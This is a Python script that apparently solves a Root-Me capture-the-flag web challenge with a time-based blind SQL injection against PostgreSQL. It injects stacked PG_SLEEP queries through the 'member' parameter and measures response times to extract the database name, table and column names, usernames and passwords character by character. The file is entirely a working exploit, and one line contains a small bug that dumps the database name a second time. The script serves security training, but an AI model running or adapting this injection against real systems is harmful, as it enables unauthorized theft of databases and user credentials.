from requests import get
from time import perf_counter


URL="http://challenge01.root-me.org/web-serveur/ch40/"


def test_char(payload,offset,condition,x):
	data = {
		"action" : "member",
		"member" : f"1;SELECT CASE WHEN (ascii(substring(({payload}),{offset},1)){condition}{x}) THEN PG_SLEEP(5) ELSE NULL END; -- -"
	}
	begin=perf_counter()
	r=get(url=URL,params=data).text
	
	end=perf_counter()
	period=end - begin
	#print(period)
	return True if period > 2 else False

def dichotomic_search(payload,offset,low,high):
	if high >=low:
		mid=(high+low) //2
		if test_char(payload,offset,"=",mid):
			return chr(mid)
		elif test_char(payload,offset,'<',mid):
			return dichotomic_search(payload,offset,low,mid-1)
		else :
			return dichotomic_search(payload,offset,mid+1,high)
	else :
		return None

def dump(payload):
	dumped=''
	i=len(dumped)+1
	while True :
		char=dichotomic_search(payload,i,1,128)
		if char is not None:
			dumped+=char
			#print(dumped)
		else :
			break
		i+=1
	return dumped


#'''
#Dumping Current Database
curDB=dump("current_database()")
print(dump(curDB)#c_webserveur_40

#Dumping Table names
i=0
while True:
	TabName=dump(f"(select table_name from information_schema.tables LIMIT 1 offset {i})::text")
	if TabName =='':break
	print(TabName)
	i+=1


#Dumping Column Names
i=0
while True:
	ColName=dump(f"(select column_name from information_schema.columns LIMIT 1 offset {i})::text")
	if ColName =='':break
	print(ColName)
	i+=1


#Dumpipng usernames
i=0
while True:
	username=dump(f"(select username from users LIMIT 1 offset {i})::text")
	if username =='':break
	print(username)
	i+=1
#'''

#Dumping passwords
i=0
while True:
	password=dump(f"(select password from users LIMIT 1 offset {i})::text")
	if password =='':break
	print(password)
	i+=1